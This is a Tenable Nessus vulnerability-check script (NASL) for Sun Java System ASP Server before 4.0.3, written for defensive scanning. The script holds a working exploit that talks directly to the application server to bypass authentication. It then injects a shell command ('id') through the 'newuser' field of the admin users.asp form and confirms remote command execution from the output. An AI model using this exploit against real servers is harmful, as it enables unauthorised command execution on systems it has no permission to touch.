#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(33440);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2008-2405", "CVE-2008-2406");
  script_bugtraq_id(29539, 29550);
  script_osvdb_id(46019, 46020);
  script_xref(name:"IAVA", value:"2008-A-0038");
  script_xref(name:"Secunia", value:"30523");

  script_name(english:"Sun Java System ASP Server < 4.0.3 Multiple Vulnerabilities");
  script_summary(english:"Tries to bypass authentication and inject a command");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by several vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Sun Java System Active Server Pages (ASP), or an
older variant such as Sun ONE ASP or Chili!Soft ASP. 

The web server component of the installed version of Active Server
Pages on the remote host is affected by several vulnerabilities :

  - Several of the administration server's ASP applications
    fail to filter or escape user input before using it to
    generate commands before executing them in a shell.
    While access to these applications nominally requires
    authentication, there are reportedly several methods
    of bypassing authentication (CVE-2008-2405).

  - An attacker can bypass administration server 
    authentication by connection to the application
    server directly and making requests. This issue does
    not affect ASP Server on a Windows platform 
    (CVE-2008-2406)." );
 # http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=709
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d90b8781" );
 # http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=710
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?54eb5bc5" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Jun/30" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Jun/33" );
 script_set_attribute(attribute:"see_also", value:"http://download.oracle.com/sunalerts/1019285.1.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Sun Java System ASP version 4.0.3 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 287);
 script_set_attribute(attribute:"patch_publication_date", value: "2008/06/03");
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/07/08");
 script_cvs_date("$Date: 2016/12/14 20:33:27 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"stig_severity", value:"I");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");
  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");
  script_dependencies("sun_asp_server_detect.nasl");
  script_require_ports("Services/casp5102", 5102, "Services/www", 5100);

  exit(0);
}


include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port5102 = get_kb_item("Services/casp5102");
port = port5102;
if (!port) port = 5102;
if (!get_port_state(port)) exit(0);


# Make sure the ASP server is working if we haven't yet detected it.
if (!port5102)
{
# We need to query the web server first, otherwise the service on port5102 
# won't answer.
  foreach http_port (add_port_in_list(list:get_kb_list("Services/www"), port:5100))
  {
    res = http_get_cache(item:"/index.asp", port:http_port);
    if ("This functionality has not been inplemented yet" >< res) break;
  }
}


# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Function to read a response.
function asp_read()
{
  local_var buf, hdr, i, j, len, pkt, req, res;

  res = "";
  for (i=0; i<10; i++)
  {
    hdr = recv(socket:soc, length:32, min:32);
    if (strlen(hdr) < 32 || hdr !~ '^[0-9]+ *[0-9]+ *[0-9]\x00$')
    {
      # nb: something's wrong -- read what's left and bail.
      buf = recv(socket:soc, length:40000);
      res = string(res, hdr, buf);
      return res;
    }

    len = int(substr(hdr, 15, 29));
    if (len <= 32) return NULL;

    len -= 32;
    buf = recv(socket:soc, length:len, min:len);
    if (len != strlen(buf))
    {
      # nb: something's wrong -- read what's left and bail.
      res = string(res, hdr, buf);
      buf = recv(socket:soc, length:40000);
      res = string(res, buf);
      return res;
    }

    res = string(res, hdr, buf);

    if (i == 0 && hdr !~ "^0 +") break;
    else if (i)
    {
      if (hdr =~ "^600 ")
      {
        req = 
          asp_string(s:"0              ") +
          asp_string(s:"nimda") +
          asp_string(s:"5              ");
        req = 
          "600" + crap(data:" ", length:12) + 
          string(strlen(req)+32) + crap(data:" ", length:15-strlen(string(strlen(req)+32))) +
          "0" + mkbyte(0) + 
          req;
        send(socket:soc, data:req);
      }
      else if (hdr !~ "^60[34] ") break;
      else 
      {
        req = asp_string(s:"1              ");
        req = 
          "0" + crap(data:" ", length:14) + 
          string(strlen(req)+32) + crap(data:" ", length:15-strlen(string(strlen(req)+32))) +
          "0" + mkbyte(0) + 
          req;
        send(socket:soc, data:req);
      }
    }
  }

  return res;
}

# Function to format a string for sending to the ASP server.
function asp_string(s)
{
  return string(strlen(s)) + crap(data:" ", length:14-strlen(string(strlen(s)))) + s + mkbyte(0);
}


# Initialize some variables.
#
# - these can be tweaked.
cmd = "id";                            # command to execute (change code
                                       #   below to detect cmd output)
install_dir = "/opt/casp";             # installation directory
# - these probably shouldn't be.
cwd = install_dir+"/admin";            # working directory
user_group = "nobody/nobody";          # ?
s1 = "135218572      ";                # ?
s2 = "65538          ";                # ?


# Get a cookie.
#
# nb: it seems like there needs to be an active session, although it doesn't
#     necessarily need to be ours. But creating one ourselves should ensure
#     the PoC works.
cookie = "";
url = "/caspdoc/index.asp";
file = install_dir+url;
method = "GET";
query_string = "";

req = 
  asp_string(s:s1) +
  asp_string(s:s2) +
  asp_string(s:user_group) +
  asp_string(s:method) +
  asp_string(s:query_string) +
  asp_string(s:url) +
  asp_string(s:file) +
  asp_string(s:cookie) +
  asp_string(s:"") +
  asp_string(s:"") +
  asp_string(s:"0              ") +
  asp_string(s:"") +
  asp_string(s:"") +
  asp_string(s:"/") +
  asp_string(s:cwd) +
  asp_string(s:"0              ");
req = 
  "606" + crap(data:" ", length:12) + 
  string(strlen(req)+32) + crap(data:" ", length:15-strlen(string(strlen(req)+32))) +
  "1" + mkbyte(0) + 
  req;
send(socket:soc, data:req);
res = asp_read();

cookie = "";
if ("Set-Cookie: ASPSESSIONID" >< res)
{
  cookie = strstr(res, "Set-Cookie: ASPSESSIONID") - "Set-Cookie: ";
  if ("; path=" >< cookie) cookie = cookie - strstr(cookie, "; path=");
  else cookie = "";
}
if (!strlen(cookie))
{
  exit(1, "cannot get a session cookie");
}


# Try to exploit the issue to run a command.
file = install_dir+"/admin/web/users.asp";
method = "POST";
query_string = "";
server = install_dir+"/asp-server-3000";
url = "/caspadmin/users.asp";

for (fd=8; fd<20; fd++)
{
  exploit = string("NESSUS ;", cmd, ">&", fd, "; sleep 1; echo ");
  exploit = urlencode(str:exploit);
  postdata = string(
    "server=", urlencode(str:server), "&",
    "numrows=2&",
    "btnComponents=Add&",
    "newuser=", exploit, "&",
    "pass1=nopass&",
    "pass2=nopass&",
    "btn=Add+user"
  );

  req = 
    asp_string(s:s1) +
    asp_string(s:s2) +
    asp_string(s:user_group) +
    asp_string(s:method) +
    asp_string(s:query_string) +
    asp_string(s:url) +
    asp_string(s:file) +
    asp_string(s:cookie) +
    asp_string(s:"application/x-www-form-urlencoded") +
    asp_string(s:postdata) +
    asp_string(s:strlen(postdata)+crap(data:" ", length:15-strlen(string(strlen(postdata))))) +
    asp_string(s:strlen(postdata)+crap(data:" ", length:15-strlen(string(strlen(postdata))))) +
    asp_string(s:"/") +
    asp_string(s:cwd) +
    asp_string(s:"0              ");
  req = 
    "606" + crap(data:" ", length:12) + 
    string(strlen(req)+32) + crap(data:" ", length:15-strlen(string(strlen(req)+32))) +
    "1" + mkbyte(0) + 
    req;
  send(socket:soc, data:req);
  res = asp_read();

  if ("uid=" >< res)
  {
    output = strstr(res, "uid=");
    output = output - strstr(output, '\n');
    if (egrep(pattern:"^uid=[0-9]+.*gid=[0-9]+.*", string:output))
    {
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote\n",
          "host, which produced the following output :\n",
          "\n",
          "  ", output, "\n"
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}

close(soc);
